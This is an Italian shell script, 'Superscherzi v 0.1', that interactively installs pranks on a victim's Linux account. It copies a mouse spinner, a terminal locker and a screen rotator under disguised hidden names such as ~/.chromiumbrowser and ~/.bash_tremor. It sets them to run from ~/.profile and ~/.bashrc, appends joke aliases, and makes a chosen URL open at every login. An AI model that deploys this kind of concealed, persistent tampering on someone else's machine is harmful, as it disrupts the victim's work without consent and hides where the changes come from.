#!/bin/sh

# Script che quando lanciato chiede che tipo di disturbo si vuole dare alla povera vittima
# e si occupa di fare tutti gli scherzi
echo "*** Superscherzi v 0.1 ***"


# Spinmouse con timer.
# Default: ./spinmouse.sh 4 1 60
echo "### SPINMOUSE"
echo "Muove il mouse di moto circolare ad intermittenza"
echo -n "Lo vuoi aggiungere? [y/N] "
read resp

case "$resp" in
	y)
		echo -n "Installazione... "
		cp spinmouse.sh ~/.chromiumbrowser
		chmod u+x ~/.chromiumbrowser
		echo "~/.chromiumbrowser 4 1 30 &" >> ~/.profile
		echo "DONE"
		;;
	*)
		echo "SKIPPED"
		;;
esac


# Lolterminale
echo "### LOLTERMINALE"
echo "Mette alcuni alias molto divertenti al terminale"
echo -n "Lo vuoi aggiungere? [y/N] "
read resp

case "$resp" in
	y)
		echo -n "Installazione... "
		cat lolterminale >> ~/.bashrc
		echo "DONE"
		;;
	*)
		echo "SKIPPED"
		;;
esac


# Lockterminale
echo "### LOCKTERMINALE"
echo "Non permette di eseguire comandi sul terminale fino a quando non viene lasciata una riga vuota"
echo -n "Lo vuoi aggiungere? [y/N] "
read resp

case "$resp" in
	y)
		echo -n "Installazione... "
		cp lockterminale.sh ~/.bash_tremor
		chmod u+x ~/.bash_tremor
		echo "~/.bash_tremor" >> ~/.bashrc
		echo "DONE"
		;;
	*)
		echo "SKIPPED"
		;;
esac


# Apertura di pagina browser
echo "### BROWSE"
echo "Apre una pagina del browser di default al login grafico"
echo -n "Lo vuoi aggiungere? [y/N] "
read resp

case "$resp" in
	y)
		echo -n "URL del sito: "
		read sito
		echo "x-www-browser $sito &" >> ~/.profile
		echo "Installato"
		;;
	*)
		echo "SKIPPED"
		;;
esac



# Ruota lo schermo
echo "### ROTATE SCREEN"
echo "Ruota lo schermo con una certa probabilità"
echo -n "Lo vuoi aggiungere? [y/N] "
read resp

case "$resp" in
	y)
		echo -n "Installazione... "
                cp rotatescreen.sh ~/.tuxgamemad
                chmod u+x ~/.tuxgamemad
                echo "~/.tuxgamemad 60 &" >> ~/.profile
                echo "DONE"
		;;
	*)
		echo "SKIPPED"
		;;
esac
